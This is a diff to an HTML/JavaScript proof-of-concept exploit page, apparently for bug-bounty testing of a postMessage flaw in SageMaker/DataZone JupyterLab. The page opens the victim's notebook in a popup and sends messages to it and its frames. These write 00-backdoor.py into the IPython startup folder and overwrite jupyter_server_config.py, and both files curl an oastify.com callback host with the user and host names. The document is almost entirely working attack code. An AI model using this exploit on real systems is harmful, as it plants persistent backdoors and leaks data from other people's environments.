@@ -25,7 +25,6 @@
 
   <button id="launchBtn">Click Anywhere To Launch Exploit</button>
   <div id="status"></div>
-  <iframe id="target" style="width:100%;height:300px;margin-top:15px;border:1px solid #90b0e0;display:none;"></iframe>
 
 <script>
 var CALLBACK = '2nqdaq56ymdtf45fbkjtbga9w02rqje8.oastify.com';
@@ -39,61 +38,75 @@ function status(msg, cls) {
   document.getElementById('status').innerHTML += '<div class="' + (cls||'') + '">' + msg + '</div>';
 }
 
-function sendPayload(target, path, content, label) {
+function sendPayload(target, path, content) {
   target.postMessage({
     type: 'sagemaker:nbevent:OpenOrCreateFile',
     payload: { type: 'file', path: path, content: content, format: 'text' }
   }, '*');
-  status(label, 'ok');
+}
+
+function firePayloads(w) {
+  // Spray postMessage to the popup window itself + all its child frames
+  // (the JupyterLab iframe inside the DataZone page)
+  var targets = [w];
+  try { for (var i = 0; i < w.length; i++) targets.push(w[i]); } catch(e) {}
+  status('Found ' + targets.length + ' target(s) (window + ' + (targets.length - 1) + ' frames). Sending payloads...', 'ok');
+
+  targets.forEach(function(t) {
+    sendPayload(t,
+      '.ipython/profile_default/startup/00-backdoor.py',
+      'import os; os.system("curl https://' + CALLBACK + '/ipython-startup?user=$(whoami)\\&host=$(hostname)")'
+    );
+  });
+  status('[1/2] Wrote .ipython/profile_default/startup/00-backdoor.py', 'ok');
+  status('       → Executes every time a Jupyter kernel starts', 'ok');
+
+  setTimeout(function() {
+    targets.forEach(function(t) {
+      sendPayload(t,
+        '.jupyter/jupyter_server_config.py',
+        'import os; os.system("curl https://' + CALLBACK + '/jupyter-config?user=$(whoami)\\&host=$(hostname)")'
+      );
+    });
+    status('[2/2] Wrote .jupyter/jupyter_server_config.py', 'ok');
+    status('       → Executes on Jupyter server restart', 'ok');
+    status('Check Burp Collaborator for callbacks.', 'warn');
+  }, 500);
 }
 
 function exploit() {
   var url = document.getElementById('url').value.trim();
   var wait = parseInt(document.getElementById('wait').value) || 12000;
 
-  // Embed target as iframe — avoids popup blockers and close issues
-  var iframe = document.getElementById('target');
-  iframe.src = url;
-  iframe.style.display = 'block';
-  status('Loading target in iframe. Waiting ' + wait + 'ms...', 'warn');
+  // Open popup — must be triggered from user click (we are)
+  var w = window.open(url, '_blank');
+  if (!w) { status('Popup blocked — allow popups and retry.', 'err'); return; }
+  status('Popup opened. Polling until ready (up to ' + wait + 'ms)...', 'warn');
 
-  setTimeout(function() {
-    var outer = iframe.contentWindow;
-    if (!outer) { status('Cannot access iframe contentWindow.', 'err'); return; }
-
-    // The DataZone page itself has a nested iframe (sagemaker-ui-code-ide)
-    // containing JupyterLab. Try nested frame first, fall back to outer.
-    var target = outer[0] || outer;
-    var via = outer[0] ? 'nested iframe (outer[0])' : 'outer iframe directly';
-    status('Targeting: ' + via + '. Sending payloads...', 'ok');
-
-    // Also spray all child frames in case the index varies
-    var frames = [target];
-    try { for (var i = 0; i < outer.length; i++) frames.push(outer[i]); } catch(e) {}
-
-    frames.forEach(function(f) {
-      // Attack 1: IPython startup — executes on every kernel start
-      sendPayload(f,
-        '.ipython/profile_default/startup/00-backdoor.py',
-        'import os; os.system("curl https://' + CALLBACK + '/ipython-startup?user=$(whoami)\\&host=$(hostname)")',
-        '[1/2] Wrote .ipython/profile_default/startup/00-backdoor.py'
-      );
-    });
-    status('       → Executes every time a Jupyter kernel starts', 'ok');
-
-    setTimeout(function() {
-      frames.forEach(function(f) {
-        // Attack 2: Jupyter server config — executes on server restart
-        sendPayload(f,
-          '.jupyter/jupyter_server_config.py',
-          'import os; os.system("curl https://' + CALLBACK + '/jupyter-config?user=$(whoami)\\&host=$(hostname)")',
-          '[2/2] Wrote .jupyter/jupyter_server_config.py'
-        );
-      });
-      status('       → Executes on Jupyter server restart', 'ok');
-      status('Check Burp Collaborator for callbacks.', 'warn');
-    }, 500);
-  }, wait);
+  // Poll every 2s instead of a single setTimeout — handles auth redirects
+  // that temporarily make the window appear closed/empty
+  var elapsed = 0;
+  var interval = 2000;
+  var timer = setInterval(function() {
+    elapsed += interval;
+    if (w.closed) {
+      // Window might reopen via redirect — keep waiting unless timeout
+      if (elapsed >= wait) {
+        clearInterval(timer);
+        status('Popup closed and did not reopen within timeout.', 'err');
+        status('Tip: manually open the target URL first, then re-run the PoC.', 'warn');
+      }
+      return;
+    }
+    // Window is open — check if frames have loaded
+    var frameCount = 0;
+    try { frameCount = w.length; } catch(e) {}
+    status('Poll ' + (elapsed/1000) + 's: window open, ' + frameCount + ' frame(s)', '');
+    if (frameCount > 0 || elapsed >= wait) {
+      clearInterval(timer);
+      firePayloads(w);
+    }
+  }, interval);
 }
 </script>
 </body>
